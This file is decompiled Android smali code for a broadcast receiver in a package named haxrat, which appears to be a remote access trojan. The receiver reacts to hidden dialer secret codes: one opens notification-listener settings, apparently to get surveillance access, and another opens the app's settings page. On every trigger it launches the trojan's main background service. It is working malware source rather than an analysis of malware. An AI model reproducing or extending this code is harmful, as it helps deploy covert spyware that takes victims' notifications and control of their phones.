.class public Lcom/hax4us/haxrat/MyReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MyReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 10
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 18
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move-object v8, v2

    invoke-virtual {v8}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v8

    const-string v9, "android.provider.Telephony.SECRET_CODE"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 19
    move-object v8, v2

    invoke-virtual {v8}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object v8

    move-object v4, v8

    .line 20
    move-object v8, v4

    const-string v9, "://"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 21
    move-object v8, v5

    const/4 v9, 0x1

    aget-object v8, v8, v9

    const-string v9, "8088"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 22
    move-object v8, v1

    new-instance v9, Landroid/content/Intent;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    const-string v11, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v10, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v9}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 29
    :cond_0
    :goto_0
    new-instance v8, Landroid/content/Intent;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    move-object v10, v1

    :try_start_0
    const-string v11, "com.hax4us.haxrat.MainService"

    invoke-static {v11}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v11

    invoke-direct {v9, v10, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v2, v8

    .line 30
    move-object v8, v1

    move-object v9, v2

    invoke-virtual {v8, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v8

    return-void

    .line 23
    :cond_1
    move-object v8, v5

    const/4 v9, 0x1

    aget-object v8, v8, v9

    const-string v9, "5055"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 24
    new-instance v8, Landroid/content/Intent;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    const-string v10, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v11, Ljava/lang/StringBuffer;

    move-object v15, v11

    move-object v11, v15

    move-object v12, v15

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    const-string v12, "package:"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    move-object v12, v1

    invoke-virtual {v12}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v11

    invoke-direct {v9, v10, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    move-object v6, v8

    .line 25
    move-object v8, v1

    move-object v9, v6

    invoke-virtual {v8, v9}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 29
    :catch_0
    move-exception v8

    move-object v4, v8

    new-instance v8, Ljava/lang/NoClassDefFoundError;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    move-object v10, v4

    invoke-virtual {v10}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v8
.end method
